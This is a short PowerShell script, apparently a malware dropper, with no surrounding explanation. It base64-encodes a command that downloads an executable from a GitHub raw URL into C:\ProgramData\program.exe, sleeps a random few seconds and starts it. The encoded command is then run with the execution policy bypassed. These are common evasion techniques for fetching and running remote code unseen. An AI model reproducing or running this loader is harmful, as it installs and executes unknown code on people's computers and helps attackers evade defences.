$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('
$url = "https://github.com/floorsofolga-svg/signedfiles/raw/refs/heads/main/almajdiah_extension.exe";
$output = "C:\ProgramData\program.exe";
Invoke-WebRequest -Uri $url -OutFile $output;
$delay = Get-Random -Minimum 5 -Maximum 15;
Start-Sleep -Seconds $delay;
Start-Process $output
'))
powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand
